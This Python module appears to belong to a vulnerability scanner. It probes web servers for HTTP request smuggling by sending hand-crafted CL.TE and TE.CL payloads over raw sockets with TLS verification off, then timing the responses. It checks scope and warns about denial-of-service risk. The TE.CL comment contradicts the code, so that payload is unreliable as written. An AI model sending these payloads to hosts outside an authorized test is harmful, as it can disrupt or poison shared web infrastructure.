"""HTTP request smuggling probe (CL.TE / TE.CL).

Sends two payload shapes per target:
  * CL.TE — Content-Length is honored by the front-end, Transfer-Encoding by the back-end
  * TE.CL — front-end uses Transfer-Encoding, back-end uses Content-Length

Detection: a successful smuggle produces an unusually long response time
(>5s) for a request that should be cheap (front-end waits for more bytes
the back-end has already consumed). This is the canonical Burp-style
timing oracle.

This scanner uses raw sockets bypassing httpx — it has to, because we
need exact byte-level control over headers. It honors scope but not the
stealth rate limiter (one socket open at a time per host).

⚠ Only run against hosts where smuggling testing is explicitly in scope —
mis-targeted smuggling can DoS shared infrastructure.
"""
from __future__ import annotations

import asyncio
import ssl
import time
from typing import TYPE_CHECKING
from urllib.parse import urlparse

if TYPE_CHECKING:
    from core.orchestrator import Context


async def _raw_send(host: str, port: int, payload: bytes, use_tls: bool, timeout: float = 10.0) -> tuple[float, bytes]:
    """Open a raw TCP/TLS connection, write the payload, read until close or timeout."""
    ctx_ssl = ssl.create_default_context() if use_tls else None
    if ctx_ssl:
        ctx_ssl.check_hostname = False
        ctx_ssl.verify_mode = ssl.CERT_NONE
    start = time.perf_counter()
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ctx_ssl, server_hostname=host if use_tls else None),
            timeout=5.0,
        )
        writer.write(payload)
        await writer.drain()
        try:
            data = await asyncio.wait_for(reader.read(8192), timeout=timeout)
        except asyncio.TimeoutError:
            data = b""
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
    except Exception as exc:
        return time.perf_counter() - start, b"ERR:" + str(exc).encode()
    return time.perf_counter() - start, data


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if not host:
        return findings
    if ctx.scope and not ctx.scope.allows(url)[0]:
        return findings
    use_tls = parsed.scheme == "https"
    port = parsed.port or (443 if use_tls else 80)
    path = parsed.path or "/"

    # CL.TE: front-end honors Content-Length=4 (G\r\n\r\n), back-end honors Transfer-Encoding -> reads one chunk of size 0 then waits
    cl_te = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"G"
    ).encode()

    # TE.CL: front-end honors Transfer-Encoding (terminates after 0\r\n\r\n), back-end Content-Length=33 (waits for SMUGGLED)
    te_cl_body = "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"
    te_cl = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(te_cl_body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{te_cl_body}"
    ).encode()

    elapsed_cl_te, _ = await _raw_send(host, port, cl_te, use_tls)
    elapsed_te_cl, _ = await _raw_send(host, port, te_cl, use_tls)

    if elapsed_cl_te > 5.0 and elapsed_te_cl < 5.0:
        findings.append(_finding(url, "CL.TE", elapsed_cl_te))
    elif elapsed_te_cl > 5.0 and elapsed_cl_te < 5.0:
        findings.append(_finding(url, "TE.CL", elapsed_te_cl))
    return findings


def _finding(url: str, kind: str, elapsed: float) -> dict:
    return {
        "category": "smuggling",
        "title": f"HTTP request smuggling ({kind}) — front/back-end disagree",
        "severity": "high", "cvss": 8.1,
        "url": url,
        "evidence": f"{kind} payload triggered a {elapsed:.2f}s hang while the inverse "
                    "shape returned promptly — strong signal of header-parsing disagreement.",
        "request": f"POST {url}\nTransfer-Encoding: chunked + Content-Length",
        "metadata": {"kind": kind, "elapsed_s": elapsed},
    }
